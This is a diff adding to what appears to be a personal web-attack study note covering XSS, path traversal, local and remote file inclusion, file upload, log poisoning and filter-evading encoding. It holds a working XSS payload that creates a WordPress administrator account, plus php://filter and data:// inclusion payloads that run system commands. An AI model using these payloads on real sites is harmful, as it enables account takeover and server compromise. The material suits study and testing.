@@ -9,5 +9,71 @@ Cross-Site Scripting is a vulnerability that exploits a user's trust in a websit
 - persistent is stored in server-side
 - both persistent and reflected originates from a servers input that was not sanitized, but DOM is purely client-side
 - web
-- os agnostic
 - can be used to steal cookies, tokens and other session information, besides sensitive data
+
+```js
+let u="/wp-admin/user-new.php";let r=new XMLHttpRequest();r.open("GET",u,!1);r.send();let n=(/ser" value="([^"]*?)"/g).exec(r.responseText)[1];r=new XMLHttpRequest();r.open("POST",u,1);r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");r.send("action=createuser&_wpnonce_create-user="+n+"&user_login=_USR_&email=tmp@mail.com&pass1=_PWD_&pass2=_PWD_&role=administrator");
+```
+
+## Path Traversal
+Abusing file inclusion set in the request to perform arbitrary read
+
+### Notes
+- executed in server-side
+- web
+- used to perform arbitrary read
+- typically occurs when a web application is not sanitizing user input
+- bypass filters by encoding the payload
+
+## File Inclusion
+Similar to the path traversal, but it allows for the inclusion of file a in the application execution
+
+### Local File Inclusion
+Allows for the inclusion of a file local to the server. PHP Wrappers:
+- `php://filter`: displays the content of files, with or without encodings
+	- `php://filter/resource=_PATH_`
+	- `php://filter/convert.base64-encode/resource=_PATH_`
+- `data://`: embed data elements as plaintext or base64-encoded data in the running web application's code (requires `allow_url_include` to be enabled)
+	- `data://text/plain,<?php%20system("id");?>`
+	- `data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+`
+
+### Remote File Inclusion
+allow us to include files from a remote system over [[HTTP]] or [[SMB]] (requires `allow_url_include` to be enabled)
+
+### Notes
+- executed in server-side
+- web
+- used to execute arbitrary code
+- typically occurs when a web application is not sanitizing user input
+- Severity increased when used in conjunction with file upload or log poisoning
+
+## File Upload
+Process of exploiting and leveraging existing file upload capabilities
+
+### Server Executed File
+The first category consists of vulnerabilities enabling us to upload files that are executable by the web application
+
+### Common Upload
+The second category consists of vulnerabilities that require us to combine the file upload mechanism with another vulnerability, such as Directory Traversal, XXE, XSS, or overwriting files
+
+### Malicious File
+The third category relies on user interaction, uploading a `.docx` with malicious macros integrated
+
+### Notes
+- executed in server-side
+- web
+- used to include files in the web server
+- typically occurs when a web application is not sanitizing the file input
+
+## Log Poisoning
+Injection of payloads into specific fields for inclusion into the logging and metric systems
+- `/var/log/apache2/access.log`
+
+### Notes
+- executed in server-side
+- web?
+- used to potentiate [LFI]{Local File Inclusion}
+
+## Encoding of Characters
+For certain exploits, it becomes necessary to use specific char encoding to bypass WAFs and filters, as:
+- `%2e` during path traversal, file inclusion or log poisoning
